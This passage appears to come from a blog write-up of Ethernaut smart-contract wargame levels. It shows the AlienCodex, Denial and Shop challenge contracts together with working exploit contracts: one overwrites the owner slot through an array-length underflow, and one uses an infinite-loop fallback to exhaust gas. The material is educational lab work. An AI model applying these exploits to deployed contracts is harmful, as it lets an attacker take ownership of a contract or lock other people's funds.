&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.5.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;..&#x2F;helpers&#x2F;Ownable-05.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;AlienCodex &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Ownable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; contact;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; codex;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contacted&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    assert(contact);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;makeContact&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    contact &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;record&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 &lt;&#x2F;span&gt;&lt;span&gt;_content) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;contacted public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    codex.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;push&lt;&#x2F;span&gt;&lt;span&gt;(_content);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;retract&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;contacted public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    codex.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length--&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;revise&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;i, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 &lt;&#x2F;span&gt;&lt;span&gt;_content) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;contacted public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    codex[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _content;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When array declared, it will occupy a slot in memory like other type do as its length, and set a base address for the data area by following formula:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;keccak(slot)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and the data will be store like:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;codex[0] =&amp;gt; (keccak(slot) + 0) % 2 ** 256
&lt;&#x2F;span&gt;&lt;span&gt;codex[1] =&amp;gt; (keccak(slot) + 1) % 2 ** 256
&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span&gt;codex[i] =&amp;gt; (keccak(slot) + i) % 2 ** 256
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;thus we can override the data of owner to claim ownership.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;amp;codex[i] == &amp;amp;owner
&lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; (keccak(length_slot) + i) % 2 ** 256 == 0
&lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; (keccak(length_slot) + i) == 2 ** 256
&lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; i == 2 ** 256 - keccak(length_slot)
&lt;&#x2F;span&gt;&lt;span&gt;+ length_slot = 1
&lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; i == 2 ** 256 - keccak(1)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In addition, it should be noted that the array value will be determined according to the length range, so it is necessary to cause the length variable to underflow first.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IAlienCodex &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;makeContact&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;retract&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;revise&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;i, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 &lt;&#x2F;span&gt;&lt;span&gt;_content) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    IAlienCodex Instance;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_addr) {
&lt;&#x2F;span&gt;&lt;span&gt;      Instance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IAlienCodex&lt;&#x2F;span&gt;&lt;span&gt;(_addr);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;attack&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        unchecked{
&lt;&#x2F;span&gt;&lt;span&gt;            Instance.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;makeContact&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;            Instance.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;retract&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; index &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;**uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))));
&lt;&#x2F;span&gt;&lt;span&gt;            Instance.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;revise&lt;&#x2F;span&gt;&lt;span&gt;(index, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;))));
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;denial&quot;&gt;Denial&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Denial &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; partner; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public constant&lt;&#x2F;span&gt;&lt;span&gt; owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xA9E&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; timeLastWithdrawn;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) withdrawPartnerBalances; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; keep track of partners balances
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setWithdrawPartner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_partner) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        partner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _partner;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; withdraw 1% to recipient and 1% to owner
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; amountToSend &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; perform a call without checking return
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; The recipient can revert, the owner will still get their share
&lt;&#x2F;span&gt;&lt;span&gt;        partner.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{value:amountToSend}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(owner).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(amountToSend);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; keep track of last withdrawal time
&lt;&#x2F;span&gt;&lt;span&gt;        timeLastWithdrawn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        withdrawPartnerBalances[partner] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span&gt;  amountToSend;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; allow deposit of funds
&lt;&#x2F;span&gt;&lt;span&gt;    receive() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; convenience function
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractBalance&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To complete this level, we need prevent the  owner from withdrawing funds when they call &lt;code&gt;withdraw()&lt;&#x2F;code&gt;. that’s mean we should revert the tx in &lt;code&gt;withdraw&lt;&#x2F;code&gt; function calling process. After trying it, I found that contracts without payable will not cause revert. But we can cause gas exhaustion through an infinite loop, thus preventing the transaction from continuing.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    fallback () &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        while(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;){}
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.&lt;&#x2F;p&gt;
&lt;p&gt;If you are using a low level &lt;code&gt;call&lt;&#x2F;code&gt; to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example &lt;code&gt;call.gas(100000).value()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Typically one should follow the &lt;a href=&quot;http:&#x2F;&#x2F;solidity.readthedocs.io&#x2F;en&#x2F;latest&#x2F;security-considerations.html#use-the-checks-effects-interactions-pattern&quot;&gt;checks-effects-interactions&lt;&#x2F;a&gt; pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;Note&lt;&#x2F;em&gt;: An external &lt;code&gt;CALL&lt;&#x2F;code&gt; can use at most 63&#x2F;64 of the gas currently available at the time of the &lt;code&gt;CALL&lt;&#x2F;code&gt;. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1&#x2F;64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;shop&quot;&gt;shop&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Buyer &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Shop &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint public&lt;&#x2F;span&gt;&lt;span&gt; price &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; isSold;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;buy&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Buyer _buyer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Buyer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    if (_buyer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; price &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; !&lt;&#x2F;span&gt;&lt;span&gt;isSold) {
&lt;&#x2F;span&gt;&lt;span&gt;      isSold &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      price &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _buyer.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Just like the previous level &lt;a href=&quot;&#x2F;blog&#x2F;ethernaut&#x2F;#Elevator&quot;&gt;Elevator&lt;&#x2F;a&gt;. but at this time the interface was set to &lt;code&gt;view&lt;&#x2F;code&gt;, which means couldn’t change the state of contract like we do at Elevator.&lt;&#x2F;p&gt;
